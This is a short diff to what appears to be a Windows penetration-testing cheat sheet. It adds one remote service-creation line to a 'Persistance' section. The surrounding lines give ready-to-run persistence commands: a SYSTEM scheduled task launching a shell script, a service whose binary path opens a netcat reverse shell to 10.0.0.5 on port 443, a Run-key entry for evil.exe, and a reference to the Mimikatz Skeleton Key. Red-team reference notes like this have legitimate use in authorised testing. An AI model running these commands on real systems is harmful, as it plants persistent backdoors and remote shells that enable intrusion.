@@ -275,6 +275,7 @@ Persistance
   schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
   sc create evilsvc binpath= "c:\tools\nc 10.0.0.5 443 -e cmd.exe" start= "auto" obj= "LocalSystem" password= ""
     sc start evilsvc
+  sc \\myserver create NewService binpath= c:\windows\system32\NewServ.exe
   reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 1 /d "C:\temp\evil.exe|dll"
 
   # Mimikatz Skeleton Key (default master password is mimikatz)
